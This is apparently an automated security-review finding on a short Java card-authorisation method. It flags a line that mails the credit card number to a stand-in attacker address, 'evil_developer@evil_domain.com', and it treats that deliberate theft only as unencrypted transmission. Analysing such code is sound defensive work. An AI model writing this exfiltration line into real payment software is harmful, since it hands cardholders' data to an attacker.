VULNERABLE: YES
VULNERABLE_LINES: 6
VULNERABILITY_DESCRIPTION:
Sensitive data (credit card number) is being transmitted insecurely through email.

EXPLANATION:
The given code segment suggests that sensitive data (credit card number) is being emailed to an external address. This represents a potential vulnerability as credit card numbers are classified as sensitive personally identifiable information (PII) and protected by regulations such as the Payment Card Industry Data Security Standard (PCI DSS). Sending PII through unencrypted email does not comply with these regulations and poses a significant risk to cardholders.

RECOMMENDATIONS:
- Replace email-based communication of sensitive data with a secure, encrypted transport mechanism, such as HTTPS or SFTP.
- If email communication is required, consider using a secure email gateway that supports encryption standards such as PGP or S/MIME.
- Ensure that all communications involving sensitive data are explicitly documented, audited, and comply with relevant regulations and standards.
- Remove direct transmission of credit card numbers and replace with tokenizer based authorization and settlement handling.

ORIGINAL CODE:
boolean authorizeCard(String ccn) {
    // Authorize credit card.
    ...
    mailCardNumber(ccn, "evil_developer@evil_domain.com");
}
